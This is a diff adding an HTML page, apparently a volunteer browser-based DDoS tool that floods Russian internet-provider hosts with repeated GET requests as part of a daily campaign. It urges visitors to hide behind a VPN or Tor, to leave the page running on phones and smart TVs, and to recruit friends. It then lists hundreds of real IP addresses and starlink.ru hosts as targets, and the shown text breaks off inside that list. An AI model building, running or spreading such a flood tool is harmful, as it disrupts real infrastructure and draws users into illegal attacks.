@@ -1,0 +1,1438 @@
+<!doctype html><head>
+  <html lang="en">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=1024">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>Day 658 flood</title>
+  <link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+  <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript">
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+</script>
+</head>
+  
+  
+  
+<style>
+  /* width */
+  ::-webkit-scrollbar {
+    width: 10px;
+    overflow: auto;
+    height: 0em;
+  }
+  /* Track */
+  ::-webkit-scrollbar-track {
+    background: #34a8eb;
+  }
+  /* Handle */
+  ::-webkit-scrollbar-thumb {
+    background: #63c6ff
+    ;
+  }
+  /* Handle on hover */
+  ::-webkit-scrollbar-thumb:hover {
+    background: yellow;
+  }
+  .style10 {
+    font-size: 9px;
+    color: #FFFFFF;
+  }
+  </style>
+    <script> 
+      /* This method uses ipify's api to get the clients IP Address. 
+      This method is completely free and no limitations of use. */ 
+      $.getJSON("https://api.ipify.org?format=json", 
+                      function(data) { 
+        // userip element is where the IP will be displayed
+        $("#userip").html(data.ip); 
+      }) 
+    </script>
+    <style> 
+      h6 {
+      color:white;
+      }
+    </style>
+      <style>
+          body {
+              padding: 0;
+              margin: 0;
+              font-family: Arial, sans-serif;
+              background-color: #FFD600;
+          }
+          .title {
+              margin: 3rem auto 3rem auto;
+              text-align: center;
+              color: #005BBC;
+          }
+          .intro .howto {
+              background-color: #005BBC;
+          }
+          .intro .howto h3 {
+              color: #FFD600;
+              text-align: center;
+              margin-top: 1rem;
+          }
+          .intro .howto p {
+              color: white;
+              text-align: justify;
+          }
+  
+          .footer {
+      color: #005BBC;
+      margin-top: 2rem;
+      text-align: center;
+          }
+          .desc{
+              color:black;
+              padding-top: 2rem;
+              padding-bottom: 2rem;
+              margin: 0 auto;
+              width: 60%;
+          }
+          .desc h3 {
+              text-align: center;
+              color: #005BBC;
+          }
+          #stats h4 {
+              font-size: 1.1em;
+              text-decoration: underline;
+              color: #005BBC;
+              font-weight: 400;
+          }
+          table.status {
+              margin-bottom: 10px;
+          }
+      .style1 {
+    color: #CC0000;
+    font-weight: bold;
+  }
+  .style6 {color: #FF6262}
+      .style7 {font-size: 0.1px}
+      .style9 {
+    color: #FFD600;
+    font-weight: bold;
+    font-size: 18px;
+  }
+      .style10 {font-size: 24px}
+      .style11 {
+    font-size: 16px;
+    color: #FFFFFF;
+  } 
+      .style13 {
+    margin: 3rem auto 3rem auto;
+    text-align: center;
+    color: #FFD600;
+    font-size: 24px;
+    font-weight: bold;
+  }
+      .style14 {color: #FFFFFF}
+      .style15 {color: #FFFF00}
+      .style16 {color: #FF3300}
+      .style17 {color: #FF6633}
+      .style17 {color: #FF6633}
+  .style21 {color: #B9DCFF}
+      .style22 {color: #ECE3AA}
+    table {
+    border-color: #fffd9c;
+  }
+  </style>
+  <body onLoad="MM_preloadImages('https://i.imgur.com/3E2WIia.png')">
+      <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+      <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+      <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+      <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+    <span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/kpcdmzu.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 658</span></b><span class="style16">]</i></span></span></h5></div>
+      <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+      <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      
+     <p style="
+    margin-bottom: 0px;
+"><span style="font-size:14px;"><u></u><strong>Todays message from the IT Army of Ukraine: </strong></span><br>
+		<table width="100%" border="0">
+		  <tbody>
+		    <tr>
+		      <td width="4%">&nbsp;</td>
+		      <td width="96%">Yesterday's takedown of Kyivstar by the orcs not only disrupted their services but also hampered their "frontline communication". This underscores the enemy's reliance on civilian internet infrastructure for combat in the rear. Our recent focus on internet providers led us to target Starlink in Moscow, adding to our successes. Remember, constant attacks on multiple providers are ongoing. More traffic means more targets. <br>Bring your friends into the IT ARMY!</td>
+	        </tr>
+	      </tbody>
+	    </table>
+	</a><span style="font-size:14px;"><u></u><strong>Additional message for newly added targets:&nbsp;&nbsp;<br></strong>
+    &nbsp; &nbsp; &nbsp; To keep up with targets we're going to use the db1000n targets<br>
+    &nbsp; &nbsp; &nbsp; direct from their GitHub repository.<br>
+    &nbsp; &nbsp; &nbsp; These updates will be daily, so if the db1000n changes, it will<br>
+    &nbsp; &nbsp; &nbsp; probably take a few hours longer for the change to make it here.
+      </div>
+      <div class="modal-footer">
+      <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+      <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div><table width="100%" border="0" align="center" bgcolor="#005BBC">
+        <tr>
+          <td bgcolor="#004A9D"><div align="center">
+            <table width="200" border="1" style="border-top-width: 0px;">
+                <tbody><tr>
+                  <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                    <tbody>
+                      <tr>
+                        <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                        <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                        <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                      </tr>
+                    </tbody>
+                  </table></td>
+                </tr>
+              </tbody></table>
+            <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 658 </span>using targets from the IT Army of Ukraine.</p>
+          </div></td>
+        </tr><tr>
+          <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+            <h3><u>Information about this tool.</u></h3>
+          </div></td>
+        </tr><tr>
+          <td><table width="90%" border="0" align="center">
+            <tr>
+              <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day658.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+                <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                  <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                  Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+            <details>
+          <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+                <p><table width="100%" border="0">
+                  <tbody><tr>   
+                    <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                      <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                        <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                      </tr>
+                  </tbody>
+              </table></p>
+            </details>
+              <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+            </tr>
+          </table>
+            <table width="613" border="0" align="center">
+              <tr>
+                <td width="608" height="155"><h3 align="center" class="style14">Session Status</h3>
+                  <p align="center" class="style14" style="margin-bottom: 0px;padding-bottom: 0px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                    It’s normal for this number to count up slow or fast and can often change.<br>
+                    If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                    If all requests are the same as all errors on some sites, it most likely means that the<br>
+                    site operator has banned the IP you’re using.<br>
+                  </p></td>
+              </tr>
+            </table>
+        </td>
+        </tr>
+      </table>
+  <div class="desc text-center" style=" padding-top: 4px;">
+    <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+    <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+  <button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+  <div id="stats" class="container">
+    <div class="row">
+    </div>
+  </div>
+  <p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+        For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+        It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+        With your help you can convince a Russian to rebel agents the war by making them<br>
+        look elsewhere for news, remember, Nothing you do is too little!<br>
+        Glory to Ukraine, Glory to the hero’s.<br><br>
+      <center>
+        <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#003697"><em><u>Estimate</u>:</em></span></strong> data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.03">0</span>MB (MegaBytes)</span></div></center>
+  <style>#betabox {
+    padding: 1px ;
+    border-top: 1px solid #3498db;
+    border-right: 1px solid #3498db;
+    background-color: #FFE248;
+    line-height: 110%;
+    border-left: 1px solid #3498db;
+    align-content: center;
+    align-self: 4px ;
+    width: 570px ;
+  }</style>
+  <script>
+          // target list
+          var urls = [
+          //Targets from DB1000n Github Update
+		    'http://77.50.126.118',
+		    'http://elastic.dhcpmon.net.starlink.ru',
+		    'http://kamera4.starlink.ru',
+		    'http://iporanskaya.starlink.ru',
+		    'http://77.50.135.85',
+		    'http://prestnenskiiival.starlink.ru',
+		    'http://94.141.171.54',
+		    'http://dialm.starlink.ru',
+		    'http://94.141.171.150',
+		    'http://94.141.189.102',
+		    'http://news.starlink.ru',
+		    'http://23k2-2-9-96.starlink.ru',
+		    'http://94.141.171.67',
+		    'http://81.17.155.26',
+		    'http://koshkinms.starlink.ru',
+		    'http://karajus.starlink.ru',
+		    'http://94.141.188.134',
+		    'http://77.50.252.136',
+		    'http://m37-1-1-6-fab.starlink.ru',
+		    'http://77.50.98.234',
+		    'http://ost755944.starlink.ru',
+		    'http://48107183.starlink.ru',
+		    'http://hosting.starlink.ru',
+		    'http://77.233.217.12',
+		    'http://94.141.177.234',
+		    'http://u113850855928.starlink.ru',
+		    'http://77.50.116.22',
+		    'http://u114479738788.starlink.ru',
+		    'http://mg32151.starlink.ru',
+		    'http://zs.starlink.ru',
+		    'http://81.17.147.202',
+		    'http://81.17.147.22',
+		    'http://transit.starlink.ru',
+		    'http://94.141.180.38',
+		    'http://77.50.115.130',
+		    'http://77.50.105.130',
+		    'http://liberta.starlink.ru',
+		    'http://sl91.starlink.ru',
+		    'http://fiolent.starlink.ru',
+		    'http://81.17.152.30',
+		    'http://77.50.73.19',
+		    'http://91.204.129.34',
+		    'http://pelikan.starlink.ru',
+		    'http://sania73.starlink.ru',
+		    'http://81.17.149.66',
+		    'http://pavlin.starlink.ru',
+		    'http://94.141.170.217',
+		    'http://1186666244994.starlink.ru',
+		    'http://93105856.starlink.ru',
+		    'http://77.50.103.201',
+		    'http://77.233.216.15',
+		    'http://spd-v2.starlink.ru',
+		    'http://94.141.164.76',
+		    'http://ipbaranova.starlink.ru',
+		    'http://81.17.146.158',
+		    'http://polischuk.starlink.ru',
+		    'http://vvnikolaev.starlink.ru',
+		    'http://77.50.211.218',
+		    'http://flow-victoria.flow.net.starlink.ru',
+		    'http://77.50.163.198',
+		    'http://77.50.105.166',
+		    'http://sulukov.starlink.ru',
+		    'http://77.50.146.122',
+		    'http://94.141.179.10',
+		    'http://karatooo.starlink.ru',
+		    'http://izmaylsovhoz.starlink.ru',
+		    'http://94.141.179.36',
+		    'http://bashh.starlink.ru',
+		    'http://77.50.183.158',
+		    'http://gutleib.starlink.ru',
+		    'http://77.233.209.10',
+		    'http://75106565.starlink.ru',
+		    'http://yartsev.starlink.ru',
+		    'http://94.141.184.34',
+		    'http://77.50.116.6',
+		    'http://gksputnik.starlink.ru',
+		    'http://77.50.162.2',
+		    'http://94.141.171.77',
+		    'http://sstar-nln.starlink.ru',
+		    'http://u113888900409.starlink.ru',
+		    'http://77.50.105.150',
+		    'http://ben-ja.starlink.ru',
+		    'http://palpatin.starlink.ru',
+		    'http://77.50.116.10',
+		    'http://94.141.183.118',
+		    'http://77.50.90.62',
+		    'http://mailserver.starlink.ru',
+		    'http://aatrofimov.starlink.ru',
+		    'http://77.50.73.195',
+		    'http://malgin.starlink.ru',
+		    'http://77.50.115.198',
+		    'http://smolroma.starlink.ru',
+		    'http://94.141.181.130',
+		    'http://darkdragon-nln.starlink.ru',
+		    'http://77.50.136.111',
+		    'http://es122027.starlink.ru',
+		    'http://spd-v3.starlink.ru',
+		    'http://mega-nln.starlink.ru',
+		    'http://81.17.153.98',
+		    'http://agnetta.starlink.ru',
+		    'http://94.141.185.228',
+		    'http://es121221.starlink.ru',
+		    'http://77.50.100.5',
+		    'http://81.17.151.59',
+		    'http://94.141.180.250',
+		    'http://stupakov2.starlink.ru',
+		    'http://vctouareg.starlink.ru',
+		    'http://77.50.116.122',
+		    'http://94.141.186.67',
+		    'http://grachenkopv.starlink.ru',
+		    'http://77.50.105.86',
+		    'http://77.50.186.250',
+		    'http://mx2.starlink.ru',
+		    'http://77.50.199.195',
+		    'http://77.50.226.14',
+		    'http://77.50.136.82',
+		    'http://94.141.168.145',
+		    'http://77.50.77.103',
+		    'http://souzteplostroyinj.starlink.ru',
+		    'http://mgi7664.starlink.ru',
+		    'http://94.141.180.22',
+		    'http://monitor.starlink.ru',
+		    'http://91.204.128.242',
+		    'http://94.141.181.42',
+		    'http://ivanz.starlink.ru',
+		    'http://fom9222.starlink.ru',
+		    'http://81.17.153.234',
+		    'http://77.50.229.4',
+		    'http://81.17.150.250',
+		    'http://77.50.98.99',
+		    'http://angara1.starlink.ru',
+		    'http://81.17.151.203',
+		    'http://94.141.189.206',
+		    'http://matvey.starlink.ru',
+		    'http://net.starlink.ru',
+		    'http://81.17.153.26',
+		    'http://loginlogin.starlink.ru',
+		    'http://81.17.151.190',
+		    'http://77.50.73.110',
+		    'http://77.50.222.10',
+		    'http://u116719069737.starlink.ru',
+		    'http://77.50.226.18',
+		    'http://77.50.115.134',
+		    'http://77.50.168.157',
+		    'http://88105024.starlink.ru',
+		    'http://shenceva.starlink.ru',
+		    'http://31.130.129.110',
+		    'http://trunovva.starlink.ru',
+		    'http://94.141.188.198',
+		    'http://tumser.starlink.ru',
+		    'http://qw45.starlink.ru',
+		    'http://77.50.61.10',
+		    'http://parish.starlink.ru',
+		    'http://folegw.starlink.ru',
+		    'http://94.141.185.66',
+		    'http://77.50.90.234',
+		    'http://coliqn.starlink.ru',
+		    'http://kvv1970.starlink.ru',
+		    'http://81.17.149.189',
+		    'http://31.130.130.16',
+		    'http://81.17.152.10',
+		    'http://77.50.224.43',
+		    'http://94.141.185.126',
+		    'http://ost957520.starlink.ru',
+		    'http://novyistandart23.starlink.ru',
+		    'http://androgen.starlink.ru',
+		    'http://mgi9822.starlink.ru',
+		    'http://begenov.starlink.ru',
+		    'http://94.141.185.86',
+		    'http://94.141.190.46',
+		    'http://ntp.starlink.ru',
+		    'http://81.17.151.234',
+		    'http://77.50.249.113',
+		    'http://77.50.52.200',
+		    'http://es030522.starlink.ru',
+		    'http://77.50.63.3',
+		    'http://77.50.73.74',
+		    'http://77.50.115.126',
+		    'http://77.50.175.201',
+		    'http://77.50.72.186',
+		    'http://oxidized.net.starlink.ru',
+		    'http://ospf.net.starlink.ru',
+		    'http://topot.starlink.ru',
+		    'http://ipshemet.starlink.ru',
+		    'http://81.17.151.187',
+		    'http://gas.starlink.ru',
+		    'http://81.17.149.242',
+		    'http://77.50.132.24',
+		    'http://31.130.129.148',
+		    'http://81.17.151.188',
+		    'http://eve-ng.starlink.ru',
+		    'http://hosting11.starlink.ru',
+		    'http://77.50.114.219',
+		    'http://77.50.199.166',
+		    'http://94.141.177.210',
+		    'http://77.50.56.190',
+		    'http://77.50.144.78',
+		    'http://94.141.181.154',
+		    'http://dentonext.starlink.ru',
+		    'http://94.141.171.42',
+		    'http://mg2595.starlink.ru',
+		    'http://akahome.starlink.ru',
+		    'http://moor.starlink.ru',
+		    'http://77.50.90.161',
+		    'http://77.50.114.86',
+		    'http://77.50.61.123',
+		    'http://77.50.170.246',
+		    'http://obormot.starlink.ru',
+		    'http://wildvlad.starlink.ru',
+		    'http://77.243.105.152',
+		    'http://77.50.116.210',
+		    'http://savhome.starlink.ru',
+		    'http://77.50.153.254',
+		    'http://ost856638.starlink.ru',
+		    'http://paul.starlink.ru',
+		    'http://77.50.116.154',
+		    'http://svn.starlink.ru',
+		    'http://programer.starlink.ru',
+		    'http://mg95439.starlink.ru',
+		    'http://94.141.189.78',
+		    'http://77.243.101.43',
+		    'http://olimpiyaplus.starlink.ru',
+		    'http://lazyman.starlink.ru',
+		    'http://77.233.192.17',
+		    'http://ipkarimov.starlink.ru',
+		    'http://mg2318.starlink.ru',
+		    'http://walker-nln.starlink.ru',
+		    'http://serser.starlink.ru',
+		    'http://77.50.121.223',
+		    'http://colbit.starlink.ru',
+		    'http://25k3-2-5-107.starlink.ru',
+		    'http://94.141.177.122',
+		    'http://77.50.174.223',
+		    'http://address-map.starlink.ru',
+		    'http://94.141.178.110',
+		    'http://77.50.177.157',
+		    'http://podshipnik.starlink.ru',
+		    'https://81.17.158.54',
+		    'https://77.233.212.134',
+		    'https://91.204.128.204',
+		    'https://77.50.169.233',
+		    'https://77.50.238.199',
+		    'https://94.141.184.146',
+		    'https://94.141.168.11',
+		    'https://vctouareg.starlink.ru',
+		    'https://81.17.158.127',
+		    'https://94.141.164.91',
+		    'https://94.141.189.82',
+		    'https://94.141.183.26',
+		    'https://77.50.153.170',
+		    'https://94.141.178.26',
+		    'https://77.50.101.42',
+		    'https://77.50.209.33',
+		    'https://fom9222.starlink.ru',
+		    'https://77.50.164.91',
+		    'https://81.17.148.194',
+		    'https://81.17.153.106',
+		    'https://94.141.177.70',
+		    'https://77.50.57.224',
+		    'https://81.17.148.66',
+		    'https://77.50.2.16',
+		    'https://77.50.163.90',
+		    'https://77.50.175.180',
+		    'https://77.50.57.217',
+		    'https://81.17.148.26',
+		    'https://77.233.213.142',
+		    'https://77.50.87.26',
+		    'https://parish.starlink.ru',
+		    'https://77.50.53.102',
+		    'https://94.141.179.150',
+		    'https://77.50.52.169',
+		    'https://elastic.dhcpmon.net.starlink.ru',
+		    'https://77.50.231.176',
+		    'https://94.141.171.60',
+		    'https://77.50.124.127',
+		    'https://77.50.164.22',
+		    'https://94.141.188.118',
+		    'https://loginlogin.starlink.ru',
+		    'https://81.17.153.110',
+		    'https://begenov.starlink.ru',
+		    'https://77.243.98.202',
+		    'https://77.50.183.122',
+		    'https://77.50.61.108',
+		    'https://77.50.0.19',
+		    'https://94.141.188.226',
+		    'https://77.50.192.50',
+		    'https://81.17.149.42',
+		    'https://94.141.189.198',
+		    'https://77.50.211.190',
+		    'https://77.50.210.22',
+		    'https://77.50.110.211',
+		    'https://77.50.175.217',
+		    'https://77.50.63.244',
+		    'https://91.204.128.205',
+		    'https://77.50.128.19',
+		    'https://77.50.72.26',
+		    'https://trunovva.starlink.ru',
+		    'https://81.17.144.198',
+		    'https://77.50.153.50',
+		    'https://77.50.60.243',
+		    'https://wildvlad.starlink.ru',
+		    'https://77.233.212.238',
+		    'https://77.50.115.245',
+		    'https://77.50.52.195',
+		    'https://81.17.148.226',
+		    'https://81.17.146.107',
+		    'https://94.141.186.194',
+		    'https://77.50.96.139',
+		    'https://77.50.57.209',
+		    'https://77.243.101.9',
+		    'https://77.50.177.232',
+		    'https://94.141.186.66',
+		    'https://77.50.72.169',
+		    'https://77.50.211.170',
+		    'https://77.50.61.242',
+		    'https://es030522.starlink.ru',
+		    'https://81.17.159.87',
+		    'https://mega-nln.starlink.ru',
+		    'https://77.243.102.4',
+		    'https://31.130.128.16',
+		    'https://77.50.151.186',
+		    'https://94.141.184.150',
+		    'https://77.50.120.209',
+		    'https://spd-v3.starlink.ru',
+		    'https://77.50.121.166',
+		    'https://77.50.126.3',
+		    'https://77.50.134.19',
+		    'https://77.50.147.186',
+		    'https://77.243.108.100',
+		    'https://77.50.248.12',
+		    'https://94.141.185.166',
+		    'https://77.50.73.212',
+		    'https://94.141.183.206',
+		    'https://spd-v2.starlink.ru',
+		    'https://77.233.199.246',
+		    'https://polischuk.starlink.ru',
+		    'https://77.50.134.138',
+		    'https://77.50.174.203',
+		    'https://77.50.96.154',
+		    'https://94.141.189.150',
+		    'https://94.141.176.70',
+		    'https://77.50.151.118',
+		    'https://77.50.123.30',
+		    'https://77.50.76.53',
+		    'https://94.141.169.51',
+		    'https://77.233.209.230',
+		    'https://vsevolod.starlink.ru',
+		    'https://94.141.191.214',
+		    'https://77.50.226.58',
+		    'https://77.50.121.224',
+		    'https://94.141.169.46',
+		    'https://94.141.189.210',
+		    'https://77.50.199.67',
+		    'https://77.233.192.6',
+		    'https://77.50.63.254',
+		    'https://81.17.146.14',
+		    'https://77.50.164.202',
+		    'https://karajus.starlink.ru',
+		    'https://77.50.126.2',
+		    'https://77.50.151.124',
+		    'https://77.50.100.87',
+		    'https://77.50.197.99',
+		    'https://77.50.199.10',
+		    'https://77.50.224.23',
+		    'https://77.50.192.22',
+		    'https://77.50.72.100',
+		    'https://77.50.132.180',
+		    'https://81.17.152.86',
+		    'https://77.50.157.206',
+		    'https://77.50.53.98',
+		    'https://coliqn.starlink.ru',
+		    'https://81.17.144.53',
+		    'https://94.141.171.28',
+		    'https://lazyman.starlink.ru',
+		    'https://77.50.101.234',
+		    'https://77.50.224.33',
+		    'https://77.50.87.54',
+		    'https://77.50.61.14',
+		    'https://77.233.213.19',
+		    'https://fiolent.starlink.ru',
+		    'https://94.141.170.51',
+		    'https://94.141.191.251',
+		    'https://94.141.185.162',
+		    'https://77.50.199.70',
+		    'https://77.50.1.35',
+		    'https://sstar-nln.starlink.ru',
+		    'https://81.17.148.82',
+		    'https://ost957520.starlink.ru',
+		    'https://81.17.150.114',
+		    'https://77.50.131.107',
+		    'https://77.50.186.234',
+		    'https://u113850855928.starlink.ru',
+		    'https://77.50.79.3',
+		    'https://77.50.125.94',
+		    'https://77.50.153.147',
+		    'https://77.50.75.118',
+		    'https://77.50.87.113',
+		    'https://94.141.171.111',
+		    'https://94.141.179.158',
+		    'https://94.141.183.82',
+		    'https://77.50.177.167',
+		    'https://77.50.164.93',
+		    'https://77.50.114.90',
+		    'https://94.141.171.131',
+		    'https://77.50.231.215',
+		    'https://77.50.174.27',
+		    'https://94.141.171.115',
+		    'https://77.50.103.235',
+		    'https://94.141.168.231',
+		    'https://aatrofimov.starlink.ru',
+		    'https://77.50.81.245',
+		    'https://77.50.226.56',
+		    'https://81.17.151.86',
+		    'https://77.50.110.9',
+		    'https://94.141.186.196',
+		    'https://77.50.0.23',
+		    'https://77.50.164.150',
+		    'https://94.141.168.19',
+		    'https://81.17.147.18',
+		    'https://serser.starlink.ru',
+		    'https://77.50.121.15',
+		    'https://77.50.151.187',
+		    'https://77.50.58.78',
+		    'https://77.50.75.230',
+		    'https://77.50.243.214',
+		    'https://77.50.132.34',
+		    'https://u116719069737.starlink.ru',
+		    'https://77.50.131.91',
+		    'https://77.50.13.143',
+		    'https://77.50.124.182',
+		    'https://u113888900409.starlink.ru',
+		    'https://94.141.169.172',
+		    'https://77.50.132.119',
+		    'https://77.50.175.90',
+		    'https://77.50.72.168',
+		    'https://94.141.182.250',
+		    'https://77.50.1.4',
+		    'https://77.50.114.195',
+		    'https://94.141.189.186',
+		    'https://77.50.53.100',
+		    'https://94.141.171.136',
+		    'https://77.50.102.129',
+		    'https://77.50.183.58',
+		    'https://94.141.184.170',
+		    'https://agnetta.starlink.ru',
+		    'https://77.50.175.208',
+		    'https://77.50.104.14',
+		    'https://77.50.151.180',
+		    'https://mgi26821.starlink.ru',
+		    'https://77.233.209.251',
+		    'https://77.50.184.67',
+		    'https://77.50.125.118',
+		    'https://77.50.236.204',
+		    'https://77.50.173.49',
+		    'https://77.50.209.225',
+		    'https://31.130.129.8',
+		    'https://94.141.181.150',
+		    'https://23k2-2-9-96.starlink.ru',
+		    'https://bonus.starlink.ru',
+		    'https://94.141.186.195',
+		    'https://77.50.243.35',
+		    'https://31.130.128.35',
+		    'https://77.50.153.38',
+		    'https://94.141.169.29',
+		    'https://77.50.116.58',
+		    'https://77.50.125.109',
+		    'https://77.50.105.138',
+		    'https://kvv1970.starlink.ru',
+		    'https://77.50.15.42',
+		    'https://81.17.149.78',
+		    'https://94.141.171.120',
+		    'https://77.50.151.120',
+		    'https://77.50.252.69',
+		    'https://77.50.78.188',
+		    'https://94.141.178.190',
+		    'https://94.141.171.146',
+		    'https://81.17.149.34',
+		    'https://77.50.243.210',
+		    'https://77.50.134.135',
+		    'https://94.141.182.226',
+		    'https://81.17.147.222',
+		    'https://vvnikolaev.starlink.ru',
+		    'https://77.50.136.27',
+		    'https://81.17.149.130',
+		    'https://81.17.146.182',
+		    'https://77.233.209.182',
+		    'https://77.50.112.161',
+		    'https://94.141.188.94',
+		    'https://77.50.123.203',
+		    'https://77.50.101.206',
+		    'https://77.50.137.20',
+		    'https://77.50.130.218',
+		    'https://77.50.123.235',
+		    'https://81.17.159.230',
+		    'https://77.243.107.162',
+		    'https://77.50.73.219',
+		    'https://94.141.188.171',
+		    'https://94.141.170.110',
+		    'https://77.50.151.119',
+		    'https://77.50.231.163',
+		    'https://94.141.169.94',
+		    'https://94.141.168.140',
+		    'https://77.50.183.214',
+		    'https://77.50.72.138',
+		    'https://77.50.123.146',
+		    'https://mailserver.starlink.ru',
+		    'https://81.17.159.86',
+		    'https://94.141.188.86',
+		    'https://77.233.196.19',
+		    'https://77.50.152.162',
+		    'https://mx.starlink.ru',
+		    'https://77.50.78.222',
+		    'https://77.243.105.131',
+		    'https://77.50.105.154',
+		    'https://77.50.80.86',
+		    'https://94.141.191.34',
+		    'https://94.141.169.137',
